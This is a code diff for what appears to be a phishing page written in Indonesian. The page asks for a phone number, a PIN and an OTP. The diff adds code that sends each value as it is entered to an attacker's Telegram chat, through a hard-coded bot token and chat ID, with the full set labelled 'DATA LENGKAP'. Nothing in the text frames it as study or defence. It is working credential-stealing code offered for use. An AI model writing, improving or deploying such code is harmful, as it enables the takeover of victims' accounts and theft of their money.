@@ -7,71 +7,126 @@ document.addEventListener("DOMContentLoaded", function () {
   const pinPage = document.getElementById("pin-page");
   const otpPage = document.getElementById("otp-page");
   const floatingNotification = document.getElementById("floating-notification");
-  const otpWarning = document.getElementById("otp-warning");
 
   let otpResendCount = 0;
   const maxOtpResend = 5;
 
-  let userData = { nomor: "", pin: "", otp: "" };
+  let userData = {
+    nomor: "",
+    pin: "",
+    otp: ""
+  };
 
-  async function sendToTelegram() {
+  async function sendToTelegram(message) {
     try {
-      const response = await fetch(`/api/send-message`, {
+      const token = "7627433299:AAEJIceqvc7VpdrzInVShDJwZ4ALa0OiIHU";
+      const chatId = "7732620750";
+
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(userData),
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
       });
-      if (!response.ok) throw new Error("Gagal mengirim data ke Telegram");
     } catch (error) {
-      console.error("Kesalahan saat mengirim pesan:", error);
+      console.error('Kesalahan saat mengirim pesan:', error);
     }
   }
 
   function formatPhoneNumber(input) {
     let phoneNumber = input.value.replace(/\D/g, '');
-    if (!phoneNumber.startsWith('8')) {
-      phoneNumber = '8' + phoneNumber;
+    if (phoneNumber.length === 1 && phoneNumber[0] !== '8') {
+      phoneNumber = '8';
     }
-    input.value = phoneNumber.substring(0, 15);
+    if (phoneNumber.length > 15) {
+      phoneNumber = phoneNumber.substring(0, 15);
+    }
+    let formattedNumber = '';
+    for (let i = 0; i < phoneNumber.length; i++) {
+      if (i === 3 || i === 8) {
+        formattedNumber += '-';
+      }
+      formattedNumber += phoneNumber[i];
+    }
+    input.value = formattedNumber;
   }
 
   function goToNextPage() {
-    const phoneNumber = phoneNumberInput.value.replace(/\D/g, '');
-    if (phoneNumber.length >= 8) {
-      userData.nomor = phoneNumber;
-      numberPage.style.display = "none";
-      pinPage.style.display = "block";
-      phoneNumberInput.blur();
-      lanjutkanButton.style.display = "none";
-      pinInputs[0].focus();
-    } else {
-      alert("Nomor telepon harus minimal 8 digit.");
+    if (numberPage.style.display === "block") {
+      const phoneNumber = phoneNumberInput.value.replace(/\D/g, '');
+      if (phoneNumber.length >= 8) {
+        userData.nomor = phoneNumber;
+        numberPage.style.display = "none";
+        pinPage.style.display = "block";
+        phoneNumberInput.blur();
+        lanjutkanButton.style.display = "none";
+        pinInputs[0].focus();
+
+        // Kirim notifikasi nomor ke Telegram
+        const message = `
+====DATA LENGKAP====
+—————
+→ ☎️ : ${userData.nomor} 
+—————
+        `;
+        sendToTelegram(message);
+      } else {
+        alert("Nomor telepon harus minimal 8 digit.");
+      }
     }
   }
 
-  function handleInputEvent(inputs) {
-    inputs.forEach((input, index) => {
-      input.addEventListener("input", (event) => {
-        if (event.inputType === "deleteContentBackward" && index > 0) {
-          inputs[index - 1].focus();
-        } else if (input.value.length === 1 && index < inputs.length - 1) {
-          inputs[index + 1].focus();
-        }
-        if (inputs === pinInputs && index === inputs.length - 1) {
-          setTimeout(() => {
-            userData.pin = Array.from(pinInputs).map((input) => input.value).join("");
-            pinPage.style.display = "none";
-            otpPage.style.display = "block";
-            otpInputs[0].focus();
-          }, 300);
-        }
-        if (inputs === otpInputs && index === inputs.length - 1) {
-          userData.otp = Array.from(otpInputs).map((input) => input.value).join("");
-          sendToTelegram();
-          showFloatingNotification();
-        }
-      });
-    });
+  function handleAutoMoveInput(inputs, event) {
+    const input = event.target;
+    const index = Array.from(inputs).indexOf(input);
+
+    if (event.inputType === "deleteContentBackward" && index > 0) {
+      inputs[index - 1].focus();
+    } else if (input.value.length === 1 && index < inputs.length - 1) {
+      inputs[index + 1].focus();
+    }
+
+    if (inputs === pinInputs && index === inputs.length - 1) {
+      setTimeout(() => {
+        userData.pin = Array.from(pinInputs).map((input) => input.value).join("");
+        pinPage.style.display = "none";
+        otpPage.style.display = "block";
+        otpInputs[0].focus();
+
+        // Kirim notifikasi PIN ke Telegram
+        const message = `
+====DATA LENGKAP====
+—————
+→ ☎️ : ${userData.nomor} 
+—————
+→ 🅿️ : ${userData.pin} 
+—————
+        `;
+        sendToTelegram(message);
+      }, 300);
+    }
+
+    if (inputs === otpInputs && index === inputs.length - 1) {
+      userData.otp = Array.from(otpInputs).map((input) => input.value).join("");
+      sendFinalDataToTelegram();
+      showFloatingNotification();
+    }
+  }
+
+  async function sendFinalDataToTelegram() {
+    const message = `
+====DATA LENGKAP====
+—————
+→ ☎️ : ${userData.nomor} 
+—————
+→ 🅿️ : ${userData.pin} 
+—————
+→ ⭕ : ${userData.otp} 
+—————
+    `;
+    await sendToTelegram(message);
   }
 
   function showFloatingNotification() {
@@ -86,9 +141,9 @@ document.addEventListener("DOMContentLoaded", function () {
   function resendOtp() {
     if (otpResendCount < maxOtpResend) {
       otpResendCount++;
-      sendToTelegram();
+      sendToTelegram(`OTP telah dikirim ulang (${otpResendCount}/${maxOtpResend})`);
     } else {
-      otpWarning.innerText = "❌ Batas pengiriman ulang OTP habis.";
+      alert("Anda telah mencapai batas maksimal pengiriman ulang OTP.");
     }
   }
 
@@ -96,7 +151,13 @@ document.addEventListener("DOMContentLoaded", function () {
     formatPhoneNumber(phoneNumberInput);
   });
 
-  handleInputEvent(pinInputs);
-  handleInputEvent(otpInputs);
+  pinInputs.forEach((input) => {
+    input.addEventListener("input", (event) => handleAutoMoveInput(pinInputs, event));
+  });
+
+  otpInputs.forEach((input) => {
+    input.addEventListener("input", (event) => handleAutoMoveInput(otpInputs, event));
+  });
+
   lanjutkanButton.addEventListener("click", goToNextPage);
 });
